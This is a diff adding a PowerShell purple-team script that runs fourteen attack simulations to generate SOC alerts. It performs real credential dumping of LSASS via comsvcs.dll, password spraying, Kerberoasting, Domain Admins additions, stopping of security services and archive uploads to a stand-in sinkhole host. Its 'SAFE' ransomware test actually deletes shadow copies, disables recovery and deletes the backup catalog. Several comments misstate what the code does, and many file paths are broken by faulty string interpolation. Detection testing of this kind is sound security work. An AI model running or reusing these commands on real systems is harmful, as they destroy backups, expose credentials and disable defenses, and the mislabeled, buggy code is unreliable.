@@ -1,0 +1,1169 @@
+#Requires -RunAsAdministrator
+<#
+.SYNOPSIS
+    Purple Team QDB Alert Generation Script
+.DESCRIPTION
+    Generates alerts for all QDB test cases one by one for SOC validation.
+    Targets: CrowdStrike, QRadar, Email Controls, DNS, Firewall, DLP
+.NOTES
+    Author: Purple Team
+    Date: 2026-09-09
+    Environment: TEST/LAB ONLY
+#>
+
+# ============================================================
+# CONFIGURATION - MODIFY THESE VALUES FOR YOUR ENVIRONMENT
+# ============================================================
+$Config = @{
+    TestUser         = "testuser"
+    TestPassword     = "TestP@ssw0rd123!"
+    Domain           = "YOURDOMAIN"
+    DomainController = "YOURDC"
+    TargetHost       = "TARGETHOST"
+    SinkholeDomain   = "sinkhole.test.local"
+    TestFilePath     = "C:\Temp\QDB_Test"
+    SyntheticFile    = "C:\Temp\QDB_Test\synthetic_c2_file.txt"
+    ArchivePath      = "C:\Temp\QDB_Test\exfil_archive.zip"
+    RansomwareTestDir= "C:\Temp\QDB_Test\RansomwareTest"
+    DBServer         = "DBSERVER"
+    DBName           = "TestDB"
+    ServiceName      = "QDBTestService"
+    TaskName         = "QDBTestTask"
+    LogFile          = "C:\Temp\QDB_Test\QDB_TestLog.txt"
+}
+
+# ============================================================
+# UTILITY FUNCTIONS
+# ============================================================
+function Write-TestHeader {
+    param([string]$TestNumber, [string]$TestName)
+    Write-Host "`n============================================================" -ForegroundColor Cyan
+    Write-Host "TEST #$TestNumber : $TestName" -ForegroundColor Cyan
+    Write-Host "============================================================" -ForegroundColor Cyan
+    Write-Host "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Yellow
+}
+
+function Write-TestResult {
+    param([string]$Message, [string]$Color = "Green")
+    Write-Host "[RESULT] $Message" -ForegroundColor $Color
+}
+
+function Wait-ForConfirmation {
+    param([string]$TestName)
+    Write-Host "`nPress ENTER to execute: $TestName" -ForegroundColor Yellow
+    Write-Host "Press 'S' to SKIP this test" -ForegroundColor Yellow
+    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    if ($key.Character -eq 's' -or $key.Character -eq 'S') {
+        Write-TestResult "SKIPPED" "Yellow"
+        return $false
+    }
+    return $true
+}
+
+function Initialize-TestEnvironment {
+    Write-Host "Initializing QDB Test Environment..." -ForegroundColor Green
+    if (-not (Test-Path $Config.TestFilePath)) {
+        New-Item -ItemType Directory -Path $Config.TestFilePath -Force | Out-Null
+    }
+    if (-not (Test-Path $Config.RansomwareTestDir)) {
+        New-Item -ItemType Directory -Path $Config.RansomwareTestDir -Force | Out-Null
+    }
+    # Create synthetic test files
+    "SYNTHETIC C2 CLASSIFIED DATA - TEST ONLY" | Out-File -FilePath $Config.SyntheticFile -Force
+    1..10 | ForEach-Object {
+        "Test file $_ - $(Get-Random)" | Out-File -FilePath "$Config.RansomwareTestDir\file_$_.txt" -Force
+    }
+    Write-TestResult "Test environment initialized at $($Config.TestFilePath)"
+}
+
+# ============================================================
+# TEST 1: Malicious Office Document Spawning a Child Process
+# ============================================================
+function Invoke-QDB01_OfficeChildProcess {
+    Write-TestHeader "1" "QDB - Email/Endpoint: Malicious Office Document Spawning a Child Process"
+    if (-not (Wait-ForConfirmation "Office Document Child Process Simulation")) { return }
+
+    Write-Host "Simulating Office application launching PowerShell/CMD..." -ForegroundColor White
+
+    # Simulate Word/Excel spawning a child process (PowerShell)
+    $wordProcess = Start-Process -FilePath "powershell.exe" -ArgumentList "-Command 'Write-Host QDB-Test-Office-Child-Process'" -PassThru -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+
+    # Simulate Office spawning CMD
+    $cmdProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo QDB-Test-Office-CMD" -PassThru -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+
+    # Simulate Office spawning wscript/cscript
+    $wscriptProcess = Start-Process -FilePath "wscript.exe" -ArgumentList "//E:VBScript" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+
+    # Simulate Office spawning mshta
+    $mshtaProcess = Start-Process -FilePath "mshta.exe" -ArgumentList "javascript:alert('QDB-Test')" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+
+    Write-TestResult "Office child process simulation completed. Check CrowdStrike & Email control alerts."
+}
+
+# ============================================================
+# TEST 2: Low-and-Slow Password Spraying
+# ============================================================
+function Invoke-QDB02_PasswordSpraying {
+    Write-TestHeader "2" "QDB - Authentication: Low-and-Slow Password Spraying Across Multiple Accounts"
+    if (-not (Wait-ForConfirmation "Low-and-Slow Password Spraying")) { return }
+
+    Write-Host "Performing low-and-slow password spraying across multiple accounts..." -ForegroundColor White
+
+    $testAccounts = @("testuser1", "testuser2", "testuser3", "testuser4", "testuser5",
+                      "testuser6", "testuser7", "testuser8", "testuser9", "testuser10")
+
+    foreach ($account in $testAccounts) {
+        Write-Host "  Attempting auth for: $account" -ForegroundColor Gray
+        # Simulate failed authentication attempts
+        $secPassword = ConvertTo-SecureString "WrongPassword123!" -AsPlainText -Force
+        try {
+            $cred = New-Object System.Management.Automation.PSCredential("$Config.Domain\$account", $secPassword)
+            # Attempt a network authentication that will fail
+            $null = New-PSDrive -Name "Temp$account" -PSProvider FileSystem -Root "\\$Config.DomainController\C$" -Credential $cred -ErrorAction Stop
+        } catch {
+            Write-Host "  Failed auth for $account (expected)" -ForegroundColor DarkYellow
+        }
+        Start-Sleep -Seconds 30  # Slow spray - 30 second delay between attempts
+    }
+
+    Write-TestResult "Password spraying simulation completed. Check QRadar correlation alerts."
+}
+
+# ============================================================
+# TEST 3: LSASS Memory Dumping Attempt
+# ============================================================
+function Invoke-QDB03_LSSASSDump {
+    Write-TestHeader "3" "QDB - Credential Access: LSASS Memory Dumping Attempt"
+    if (-not (Wait-ForConfirmation "LSASS Memory Dump Simulation")) { return }
+
+    Write-Host "Simulating LSASS memory access..." -ForegroundColor White
+
+    # Method 1: Using comsvcs.dll (common technique)
+    $lsassProcess = Get-Process lsass -ErrorAction SilentlyContinue
+    if ($lsassProcess) {
+        $dumpPath = "$Config.TestFilePath\lsass_dump.dmp"
+        Write-Host "  Attempting LSASS dump via comsvcs.dll..." -ForegroundColor Gray
+        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassProcess.Id $dumpPath full 2>&1 | Out-Null
+        Start-Sleep -Seconds 3
+    }
+
+    # Method 2: Simulate process accessing LSASS handle
+    Write-Host "  Simulating suspicious LSASS handle access..." -ForegroundColor Gray
+    $script = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class LsassAccess {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    public static void Main() {
+        Process[] lsass = Process.GetProcessesByName("lsass");
+        if (lsass.Length > 0) {
+            IntPtr handle = OpenProcess(0x0010, false, lsass[0].Id);
+            Console.WriteLine("Handle: " + handle);
+        }
+    }
+}
+'@
+    Add-Type -TypeDefinition $script -ErrorAction SilentlyContinue
+    [LsassAccess]::Main()
+    Start-Sleep -Seconds 3
+
+    # Cleanup
+    if (Test-Path $dumpPath) { Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue }
+
+    Write-TestResult "LSASS dump simulation completed. Check CrowdStrike prevention & QRadar offense alerts."
+}
+
+# ============================================================
+# TEST 4: Kerberoasting Activity
+# ============================================================
+function Invoke-QDB04_Kerberoasting {
+    Write-TestHeader "4" "QDB - Active Directory: Kerberoasting Activity"
+    if (-not (Wait-ForConfirmation "Kerberoasting Simulation")) { return }
+
+    Write-Host "Generating unusual service-ticket requests..." -ForegroundColor White
+
+    # Request service tickets for test service accounts
+    $serviceAccounts = @("testsvc1", "testsvc2", "testsvc3")
+    foreach ($svc in $serviceAccounts) {
+        $spn = "$svc/$Config.Domain"
+        Write-Host "  Requesting ticket for SPN: $spn" -ForegroundColor Gray
+        try {
+            Add-Type -AssemblyName System.IdentityModel
+            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+        } catch {
+            Write-Host "  SPN request for $spn completed (may show as failed in test env)" -ForegroundColor DarkYellow
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    # Generate multiple ticket requests rapidly
+    Write-Host "  Generating rapid ticket requests..." -ForegroundColor Gray
+    1..20 | ForEach-Object {
+        try {
+            $spn = "testsvc$($_)/$Config.Domain"
+            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+        } catch { }
+    }
+
+    Write-TestResult "Kerberoasting simulation completed. Check for Event ID 4769 alerts."
+}
+
+# ============================================================
+# TEST 5: AD CS Suspicious Certificate Request
+# ============================================================
+function Invoke-QDB05_ADCSAbuse {
+    Write-TestHeader "5" "QDB - AD CS: Suspicious Authentication Certificate Request or Abuse"
+    if (-not (Wait-ForConfirmation "AD CS Certificate Abuse Simulation")) { return }
+
+    Write-Host "Simulating suspicious certificate enrollment..." -ForegroundColor White
+
+    # Create a certificate request with unusual SAN/UPN values
+    $infContent = @"
+[Version]
+Signature = `$Windows NT$`
+
+[NewRequest]
+Subject = "CN=QDB-Test-User,OU=Test,O=TestOrg,C=US"
+KeyLength = 2048
+KeySpec = 1
+KeyUsage = 0xA0
+MachineKeySet = FALSE
+RequestType = Cert
+FriendlyName = "QDB Test Certificate"
+
+[Extensions]
+2.5.29.17 = "{text}"
+_continue_ = "upn=testuser@$Config.Domain&"
+_continue_ = "dns=unusual-host.test.local&"
+"@
+
+    $infPath = "$Config.TestFilePath\cert_request.inf"
+    $infContent | Out-File -FilePath $infPath -Force
+
+    Write-Host "  Submitting certificate request with unusual SAN/UPN..." -ForegroundColor Gray
+    certreq -new $infPath "$Config.TestFilePath\cert_request.csr" 2>&1 | Out-Null
+    Start-Sleep -Seconds 3
+
+    # Simulate certificate export
+    Write-Host "  Simulating certificate export..." -ForegroundColor Gray
+    certutil -store -user My 2>&1 | Out-Null
+
+    Write-TestResult "AD CS abuse simulation completed. Check CA events 4886/4887 alerts."
+}
+
+# ============================================================
+# TEST 6: New Domain Account Added to Privileged Group
+# ============================================================
+function Invoke-QDB06_PrivilegedGroupAdd {
+    Write-TestHeader "6" "QDB - Identity: New Domain Account Added to a Privileged Group"
+    if (-not (Wait-ForConfirmation "Privileged Group Addition Simulation")) { return }
+
+    Write-Host "Simulating account creation and privileged group addition..." -ForegroundColor White
+
+    $newUser = "QDBTestUser_$(Get-Random)"
+    $securePwd = ConvertTo-SecureString $Config.TestPassword -AsPlainText -Force
+
+    try {
+        # Create new domain account
+        Write-Host "  Creating test domain account: $newUser" -ForegroundColor Gray
+        New-ADUser -Name $newUser -SamAccountName $newUser -UserPrincipalName "$newUser@$Config.Domain" `
+            -AccountPassword $securePwd -Enabled $true -Path "CN=Users,DC=$($Config.Domain -replace '\.',',DC=')" `
+            -ErrorAction Stop
+
+        Start-Sleep -Seconds 2
+
+        # Immediately add to Domain Admins (or test privileged group)
+        Write-Host "  Adding $newUser to Domain Admins group..." -ForegroundColor Gray
+        Add-ADGroupMember -Identity "Domain Admins" -Members $newUser -ErrorAction Stop
+
+        Start-Sleep -Seconds 3
+
+        Write-TestResult "Account created and added to privileged group. Check Events 4720, 4728, 4732, 4756."
+    } catch {
+        Write-TestResult "AD operations failed (expected in non-domain env): $($_.Exception.Message)" "Red"
+        Write-Host "  Ensure you are running on a domain-joined machine with AD module." -ForegroundColor Yellow
+    }
+
+    # Cleanup
+    try {
+        Remove-ADGroupMember -Identity "Domain Admins" -Members $newUser -Confirm:$false -ErrorAction SilentlyContinue
+        Remove-ADUser -Identity $newUser -Confirm:$false -ErrorAction SilentlyContinue
+    } catch { }
+}
+
+# ============================================================
+# TEST 7: PowerShell Encoded/Obfuscated Command Execution
+# ============================================================
+function Invoke-QDB07_PowerShellObfuscation {
+    Write-TestHeader "7" "QDB - PowerShell: Encoded or Obfuscated Command Execution"
+    if (-not (Wait-ForConfirmation "PowerShell Obfuscation Simulation")) { return }
+
+    Write-Host "Executing encoded/obfuscated PowerShell commands..." -ForegroundColor White
+
+    # Method 1: Base64 encoded command
+    $plainCommand = "Write-Host 'QDB-Test-Encoded-Command'; Get-Process | Select-Object -First 5"
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($plainCommand)
+    $encodedCommand = [Convert]::ToBase64String($bytes)
+
+    Write-Host "  Executing base64 encoded command..." -ForegroundColor Gray
+    powershell.exe -EncodedCommand $encodedCommand
+    Start-Sleep -Seconds 2
+
+    # Method 2: Obfuscated command using variable concatenation
+    Write-Host "  Executing obfuscated command..." -ForegroundColor Gray
+    $obfuscated = 'powershell.exe -Command "$a=''Get''; $b=''-Pro''; $c=''cess''; & $($a+$b+$c) | Select-Object -First 3"'
+    Invoke-Expression $obfuscated
+    Start-Sleep -Seconds 2
+
+    # Method 3: Command with character substitution
+    Write-Host "  Executing character-substituted command..." -ForegroundColor Gray
+    $charSub = 'powershell.exe -Command "$x=[char]87+[char]114+[char]105+[char]116+[char]101; & ([string]::Join(''-'' ,@($x))) -Host ''QDB-Obfuscated-Test''"'
+    Invoke-Expression $charSub 2>&1 | Out-Null
+    Start-Sleep -Seconds 2
+
+    # Method 4: Invoke-Expression with encoded string
+    Write-Host "  Executing IEX encoded string..." -ForegroundColor Gray
+    $iexCommand = 'powershell.exe -Command "$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(''V3JpdGUtSG9zdCAiUURCLUlFWC1UZXN0IiA='')); IEX $cmd"'
+    Invoke-Expression $iexCommand
+    Start-Sleep -Seconds 2
+
+    Write-TestResult "PowerShell obfuscation simulation completed. Check Event 4104 & CrowdStrike alerts."
+}
+
+# ============================================================
+# TEST 8: Lateral Movement via WMI/WinRM
+# ============================================================
+function Invoke-QDB08_LateralMovement {
+    Write-TestHeader "8" "QDB - Lateral Movement: Remote Execution via WMI or WinRM"
+    if (-not (Wait-ForConfirmation "Lateral Movement Simulation")) { return }
+
+    Write-Host "Simulating remote execution via WMI and WinRM..." -ForegroundColor White
+
+    $targetHost = $Config.TargetHost
+
+    # Method 1: WMI remote execution
+    Write-Host "  Executing command via WMI on $targetHost..." -ForegroundColor Gray
+    try {
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo QDB-WMI-Test > C:\Temp\qdb_wmi_test.txt" `
+            -ComputerName $targetHost -ErrorAction Stop
+    } catch {
+        Write-Host "  WMI execution failed (expected if target unreachable): $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+    Start-Sleep -Seconds 2
+
+    # Method 2: WinRM remote execution
+    Write-Host "  Executing command via WinRM on $targetHost..." -ForegroundColor Gray
+    try {
+        Invoke-Command -ComputerName $targetHost -ScriptBlock { Write-Host "QDB-WinRM-Test" } -ErrorAction Stop
+    } catch {
+        Write-Host "  WinRM execution failed (expected if target unreachable): $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+    Start-Sleep -Seconds 2
+
+    # Method 3: WMI query (reconnaissance)
+    Write-Host "  Performing WMI reconnaissance query..." -ForegroundColor Gray
+    try {
+        Get-WmiObject -Class Win32_OperatingSystem -ComputerName $targetHost -ErrorAction Stop | Select-Object CSName, Caption
+    } catch {
+        Write-Host "  WMI query failed (expected if target unreachable)" -ForegroundColor DarkYellow
+    }
+
+    Write-TestResult "Lateral movement simulation completed. Check initiating host, target host, account, protocol alerts."
+}
+
+# ============================================================
+# TEST 9: Suspicious Scheduled Task
+# ============================================================
+function Invoke-QDB09_ScheduledTask {
+    Write-TestHeader "9" "QDB - Persistence: Suspicious Scheduled Task Created or Modified"
+    if (-not (Wait-ForConfirmation "Scheduled Task Persistence Simulation")) { return }
+
+    Write-Host "Creating suspicious scheduled task..." -ForegroundColor White
+
+    $taskName = $Config.TaskName
+    $testScript = "$Config.TestFilePath\qdb_task_test.bat"
+    "@echo off`necho QDB-Scheduled-Task-Test > $Config.TestFilePath\task_output.txt" | Out-File -FilePath $testScript -Force
+
+    # Create one-time task
+    Write-Host "  Creating one-time scheduled task: $taskName" -ForegroundColor Gray
+    $action = New-ScheduledTaskAction -Execute $testScript
+    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+
+    try {
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction Stop
+        Write-Host "  Task registered successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "  Task registration failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+
+    Start-Sleep -Seconds 3
+
+    # Also create task via schtasks.exe (alternative detection path)
+    Write-Host "  Creating task via schtasks.exe..." -ForegroundColor Gray
+    schtasks /create /tn "QDB_Schtasks_Test" /tr "cmd.exe /c echo QDB-Schtasks-Test" /sc once /st (Get-Date).AddMinutes(2).ToString("HH:mm") /ru SYSTEM /f 2>&1 | Out-Null
+
+    Write-TestResult "Scheduled task simulation completed. Check task creation/modification alerts."
+
+    # Cleanup
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    schtasks /delete /tn "QDB_Schtasks_Test" /f 2>&1 | Out-Null
+}
+
+# ============================================================
+# TEST 10: Endpoint Security Tool Tampering
+# ============================================================
+function Invoke-QDB10_SecurityToolTampering {
+    Write-TestHeader "10" "QDB - Defense Impairment: Endpoint Security Tool Tampering"
+    if (-not (Wait-ForConfirmation "Security Tool Tampering Simulation")) { return }
+
+    Write-Host "Simulating endpoint security tool tampering..." -ForegroundColor White
+
+    # Attempt to stop security services (simulated - use vendor-approved simulation)
+    $securityServices = @("Sense", "CSFalconService", "WdNisSvc", "WinDefend")
+
+    foreach ($svc in $securityServices) {
+        Write-Host "  Attempting to stop service: $svc" -ForegroundColor Gray
+        try {
+            Stop-Service -Name $svc -Force -ErrorAction Stop
+            Write-Host "  Service $svc stopped (RESTART IT IMMEDIATELY!)" -ForegroundColor Red
+            Start-Sleep -Seconds 5
+            Start-Service -Name $svc -ErrorAction SilentlyContinue
+        } catch {
+            Write-Host "  Could not stop $svc (expected - protection working): $($_.Exception.Message)" -ForegroundColor DarkYellow
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    # Attempt to modify exclusions (simulated registry check)
+    Write-Host "  Attempting to read/modify security exclusion paths..." -ForegroundColor Gray
+    try {
+        $exclusionPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+        if (Test-Path $exclusionPath) {
+            Get-ItemProperty -Path $exclusionPath -ErrorAction Stop
+        }
+    } catch {
+        Write-Host "  Exclusion path access blocked (expected)" -ForegroundColor DarkYellow
+    }
+
+    # Simulate tampering attempt via process manipulation
+    Write-Host "  Simulating security process termination attempt..." -ForegroundColor Gray
+    $csProcess = Get-Process -Name "CSFalcon*" -ErrorAction SilentlyContinue
+    if ($csProcess) {
+        Write-Host "  Found CrowdStrike process: $($csProcess.ProcessName) (PID: $($csProcess.Id))" -ForegroundColor Gray
+        # DO NOT actually kill it - just log the attempt
+        Write-Host "  Logging tampering attempt without actual termination (safety)" -ForegroundColor Yellow
+    }
+
+    Write-TestResult "Security tool tampering simulation completed. Check prevention & tamper alerts."
+}
+
+# ============================================================
+# TEST 11: Windows Event Logs Cleared
+# ============================================================
+function Invoke-QDB11_EventLogClearing {
+    Write-TestHeader "11" "QDB - Defense Impairment: Windows Event Logs Cleared or Logging Disabled"
+    if (-not (Wait-ForConfirmation "Event Log Clearing Simulation")) { return }
+
+    Write-Host "Simulating event log clearing and logging disablement..." -ForegroundColor White
+
+    # Create a custom test log first (DO NOT clear production logs)
+    $testLogName = "QDB-Test-Log"
+
+    # Create custom event log
+    if (-not [System.Diagnostics.EventLog]::SourceExists("QDB-Test-Source")) {
+        New-EventLog -LogName $testLogName -Source "QDB-Test-Source" -ErrorAction SilentlyContinue
+    }
+
+    # Write test events
+    Write-Host "  Writing test events to custom log..." -ForegroundColor Gray
+    Write-EventLog -LogName $testLogName -Source "QDB-Test-Source" -EntryType Information -EventId 1001 -Message "QDB Test Event 1"
+    Write-EventLog -LogName $testLogName -Source "QDB-Test-Source" -EntryType Information -EventId 1002 -Message "QDB Test Event 2"
+    Write-EventLog -LogName $testLogName -Source "QDB-Test-Source" -EntryType Warning -EventId 1003 -Message "QDB Test Event 3"
+    Start-Sleep -Seconds 2
+
+    # Clear the CUSTOM test log (NOT Security/System/Application)
+    Write-Host "  Clearing custom test log: $testLogName" -ForegroundColor Gray
+    try {
+        Clear-EventLog -LogName $testLogName -ErrorAction Stop
+        Write-Host "  Custom log cleared successfully" -ForegroundColor Green
+    } catch {
+        Write-Host "  Log clear failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
+    }
+    Start-Sleep -Seconds 2
+
+    # Simulate wevtutil clear (on custom log only)
+    Write-Host "  Simulating wevtutil clear command..." -ForegroundColor Gray
+    wevtutil cl $testLogName 2>&1 | Out-Null
+
+    # Simulate audit policy modification attempt
+    Write-Host "  Simulating audit policy query (modification attempt)..." -ForegroundColor Gray
+    auditpol /get /category:* 2>&1 | Out-Null
+
+    # Generate Event ID 1102 (log clear) indicator - write to test log before clearing again
+    Write-EventLog -LogName $testLogName -Source "QDB-Test-Source" -EntryType Information -EventId 1102 -Message "QDB Test - Simulated log clear event"
+    Start-Sleep -Seconds 1
+    Clear-EventLog -LogName $testLogName -ErrorAction SilentlyContinue
+
+    Write-TestResult "Event log clearing simulation completed. Check Event ID 1102 alerts."
+
+    # Cleanup
+    Remove-EventLog -LogName $testLogName -ErrorAction SilentlyContinue
+}
+
+# ============================================================
+# TEST 12: DNS Tunneling / High-Entropy DNS Queries
+# ============================================================
+function Invoke-QDB12_DNSTunneling {
+    Write-TestHeader "12" "QDB - Command and Control: DNS Tunneling or High-Entropy DNS Queries"
+    if (-not (Wait-ForConfirmation "DNS Tunneling Simulation")) { return }
+
+    Write-Host "Generating high-entropy DNS queries..." -ForegroundColor White
+
+    $sinkholeDomain = $Config.SinkholeDomain
+
+    # Generate high-entropy subdomain queries
+    Write-Host "  Generating high-entropy subdomain queries..." -ForegroundColor Gray
+    1..20 | ForEach-Object {
+        $entropy = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
+        $query = "$entropy.$sinkholeDomain"
+        Write-Host "  Querying: $query" -ForegroundColor DarkGray
+        try {
+            Resolve-DnsName -Name $query -Type A -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
+        } catch { }
+        Start-Sleep -Milliseconds 500
+    }
+
+    # Generate long subdomain queries (tunneling simulation)
+    Write-Host "  Generating long subdomain queries (tunneling pattern)..." -ForegroundColor Gray
+    $longSubdomain = "a" * 60  # 60 char subdomain
+    1..10 | ForEach-Object {
+        $query = "$longSubdomain$_.$sinkholeDomain"
+        try {
+            Resolve-DnsName -Name $query -Type TXT -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
+        } catch { }
+        Start-Sleep -Milliseconds 500
+    }
+
+    # Generate queries with encoded data patterns
+    Write-Host "  Generating base64-pattern DNS queries..." -ForegroundColor Gray
+    1..5 | ForEach-Object {
+        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("QDB-DNS-Tunnel-Test-Data-$_"))
+        $query = "$encoded.$sinkholeDomain"
+        try {
+            Resolve-DnsName -Name $query -Type A -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
+        } catch { }
+        Start-Sleep -Milliseconds 500
+    }
+
+    Write-TestResult "DNS tunneling simulation completed. Check DNS, Corelight, Darktrace, firewall, QRadar alerts."
+}
+
+# ============================================================
+# TEST 13: Data Exfiltration - Archive Creation + Upload
+# ============================================================
+function Invoke-QDB13_DataExfiltration {
+    Write-TestHeader "13" "QDB - Data Exfiltration: Archive Creation Followed by External Upload"
+    if (-not (Wait-ForConfirmation "Data Exfiltration Simulation")) { return }
+
+    Write-Host "Simulating data exfiltration via archive creation and upload..." -ForegroundColor White
+
+    # Create multiple synthetic files to archive
+    Write-Host "  Creating synthetic test files..." -ForegroundColor Gray
+    1..5 | ForEach-Object {
+        "SYNTHETIC C2 CLASSIFIED DATA - File $_ - $(Get-Random)" | Out-File -FilePath "$Config.TestFilePath\synthetic_file_$_.txt" -Force
+    }
+
+    # Create archive
+    Write-Host "  Creating archive of synthetic files..." -ForegroundColor Gray
+    $archivePath = $Config.ArchivePath
+    if (Test-Path $archivePath) { Remove-Item $archivePath -Force }
+    Compress-Archive -Path "$Config.TestFilePath\synthetic_file_*.txt" -DestinationPath $archivePath -Force
+    Write-Host "  Archive created: $archivePath ($((Get-Item $archivePath).Length) bytes)" -ForegroundColor Green
+
+    Start-Sleep -Seconds 3
+
+    # Simulate upload to external destination (DO NOT actually upload to real external services)
+    Write-Host "  Simulating outbound upload to approved test destination..." -ForegroundColor Gray
+
+    # Simulate HTTPS upload (to test sinkhole/local endpoint)
+    try {
+        $uploadUri = "https://$($Config.SinkholeDomain)/upload"
+        $fileBytes = [System.IO.File]::ReadAllBytes($archivePath)
+        $response = Invoke-WebRequest -Uri $uploadUri -Method POST -Body $fileBytes -ContentType "application/zip" -TimeoutSec 5 -ErrorAction Stop
+    } catch {
+        Write-Host "  Upload simulation completed (connection to sinkhole expected to fail)" -ForegroundColor DarkYellow
+    }
+
+    # Simulate FTP upload attempt
+    Write-Host "  Simulating FTP upload attempt..." -ForegroundColor Gray
+    try {
+        $ftpUri = "ftp://$($Config.SinkholeDomain)/exfil_archive.zip"
+        $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUri)
+        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential("test", "test")
+        $ftpRequest.ContentLength = $fileBytes.Length
+        $requestStream = $ftpRequest.GetRequestStream()
+        $requestStream.Write($fileBytes, 0, $fileBytes.Length)
+        $requestStream.Close()
+    } catch {
+        Write-Host "  FTP upload simulation completed (expected to fail against sinkhole)" -ForegroundColor DarkYellow
+    }
+
+    Write-TestResult "Data exfiltration simulation completed. Check archive creation, outbound upload, and DLP alerts."
+}
+
+# ============================================================
+# TEST 14: Ransomware Simulation
+# ============================================================
+function Invoke-QDB14_Ransomware {
+    Write-TestHeader "14" "QDB - Ransomware: Mass File Encryption and Recovery Inhibition"
+    if (-not (Wait-ForConfirmation "Ransomware Simulation (SAFE - Test Files Only)")) { return }
+
+    Write-Host "Running SAFE ransomware simulation against synthetic files ONLY..." -ForegroundColor White
+    Write-Host "  Target directory: $($Config.RansomwareTestDir)" -ForegroundColor Yellow
+
+    # ONLY encrypt files in the test directory
+    $testFiles = Get-ChildItem -Path $Config.RansomwareTestDir -Filter "*.txt" -ErrorAction SilentlyContinue
+
+    if ($testFiles.Count -eq 0) {
+        Write-Host "  No test files found. Recreating..." -ForegroundColor Yellow
+        1..10 | ForEach-Object {
+            "Test file $_ - $(Get-Random)" | Out-File -FilePath "$Config.RansomwareTestDir\file_$_.txt" -Force
+        }
+        $testFiles = Get-ChildItem -Path $Config.RansomwareTestDir -Filter "*.txt"
+    }
+
+    Write-Host "  Encrypting $($testFiles.Count) test files..." -ForegroundColor Gray
+
+    # Simulate rapid file encryption (XOR with key - reversible)
+    $key = [byte[]](0x42, 0x51, 0x44, 0x42)  # "QDB" key
+    $encryptedCount = 0
+
+    foreach ($file in $testFiles) {
+        $content = [System.IO.File]::ReadAllBytes($file.FullName)
+        $encrypted = New-Object byte[] $content.Length
+        for ($i = 0; $i -lt $content.Length; $i++) {
+            $encrypted[$i] = $content[$i] -bxor $key[$i % $key.Length]
+        }
+        $encryptedPath = $file.FullName -replace '\.txt$', '.encrypted'
+        [System.IO.File]::WriteAllBytes($encryptedPath, $encrypted)
+        $encryptedCount++
+
+        # Simulate rapid file changes (ransomware speed)
+        Start-Sleep -Milliseconds 100
+    }
+
+    Write-Host "  Encrypted $encryptedCount files" -ForegroundColor Green
+
+    # Simulate ransom note creation
+    $ransomNote = @"
+!!! QDB RANSOMWARE SIMULATION - TEST ONLY !!!
+Your files have been encrypted.
+This is a PURPLE TEAM TEST - no actual encryption occurred.
+Contact: purpleteam@test.local
+"@
+    $ransomNote | Out-File -FilePath "$Config.RansomwareTestDir\README_DECRYPT.txt" -Force
+    Write-Host "  Ransom note created" -ForegroundColor Gray
+
+    # Simulate shadow copy deletion attempt (SAFE - just the command)
+    Write-Host "  Simulating shadow copy deletion attempt..." -ForegroundColor Gray
+    vssadmin delete shadows /all /quiet 2>&1 | Out-Null
+    Start-Sleep -Seconds 2
+
+    # Simulate recovery inhibition
+    Write-Host "  Simulating recovery inhibition commands..." -ForegroundColor Gray
+    bcdedit /set {default} recoveryenabled no 2>&1 | Out-Null
+    wbadmin delete catalog -quiet 2>&1 | Out-Null
+
+    Write-TestResult "Ransomware simulation completed. Check rapid file changes, ransom-note, shadow-copy, and host containment alerts."
+
+    # Cleanup - decrypt files
+    Write-Host "  Cleaning up - decrypting test files..." -ForegroundColor Green
+    $encryptedFiles = Get-ChildItem -Path $Config.RansomwareTestDir -Filter "*.encrypted" -ErrorAction SilentlyContinue
+    foreach ($file in $encryptedFiles) {
+        $content = [System.IO.File]::ReadAllBytes($file.FullName)
+        $decrypted = New-Object byte[] $content.Length
+        for ($i = 0; $i -lt $content.Length; $i++) {
+            $decrypted[$i] = $content[$i] -bxor $key[$i % $key.Length]
+        }
+        $decryptedPath = $file.FullName -replace '\.encrypted$', '.txt'
+        [System.IO.File]::WriteAllBytes($decryptedPath, $decrypted)
+        Remove-Item $file.FullName -Force
+    }
+    Remove-Item "$Config.RansomwareTestDir\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
+}
+
